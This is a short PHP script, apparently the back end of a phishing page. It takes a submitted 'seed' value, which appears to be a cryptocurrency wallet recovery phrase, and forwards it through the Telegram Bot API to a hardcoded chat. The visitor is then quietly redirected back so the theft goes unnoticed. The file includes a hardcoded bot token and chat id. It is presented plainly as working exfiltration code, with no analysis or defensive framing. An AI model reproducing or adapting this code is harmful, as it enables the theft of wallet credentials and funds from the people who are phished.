<?php 
//create array
$parameters=array(
"chat_id" =>'2056334457',
"text" => ''.$_POST['seed'].''
);
send("sendMessage",$parameters);
//create Function Send Message
function send($method,$parameters){
    $bot_token='5113083511:AAGstxTNxpfK0ltwpRilia63bFHzFB7XzOA';
    $url="https://api.telegram.org/bot$bot_token/$method";

    if(!$curl = curl_init()){
        exit();
    }
    curl_setopt($curl,CURLOPT_POST, true);
    curl_setopt($curl,CURLOPT_POSTFIELDS,$parameters);
    curl_setopt($curl,CURLOPT_URL,$url);
    curl_setopt($curl,CURLOPT_RETURNTRANSFER,true);
    $output= curl_exec($curl);
    header("Location: /");
    echo '<script type="text/javascript"> history.back(); location.reload();</script>';
    return $output;


}
?>